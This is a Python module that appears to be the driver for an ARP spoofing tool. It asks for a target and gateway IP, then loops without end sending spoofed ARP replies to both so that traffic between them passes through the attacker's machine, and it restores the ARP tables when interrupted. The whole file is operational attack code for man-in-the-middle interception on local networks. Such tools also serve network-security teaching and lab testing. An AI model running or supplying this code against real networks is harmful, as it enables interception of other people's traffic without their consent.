from src.utils.requester import requester
from src.utils.validator import validator_execution
from src.controller.controller import ARPSpoofer
import sys
import time


class ARPSpooferExecution:
    def spoof(self):
        try:
            target_ip = requester.request_target_ip()
            validator_execution.validate_ip(target_ip)

            gateway_ip = requester.request_gateway_ip()
            validator_execution.validate_ip(gateway_ip)
            
            try:
                arp_spoofer = ARPSpoofer()
                sent_packets = 0
                while True:
                    arp_spoofer.spoof(target_ip, gateway_ip)
                    arp_spoofer.spoof(gateway_ip, target_ip)
                    sent_packets+=2
                    print("\r[+] Sent packets: " + str(sent_packets)),
                    sys.stdout.flush()
                    time.sleep(2)
                    
            except KeyboardInterrupt:
                print("\n[-] Ctrl + C detected. Restoring ARP tables...")
                arp_spoofer.undo_spoof(target_ip, gateway_ip)
                arp_spoofer.undo_spoof(gateway_ip, target_ip)
        except Exception as exception:
            print(exception)
        
arp_spoofer_execution = ARPSpooferExecution()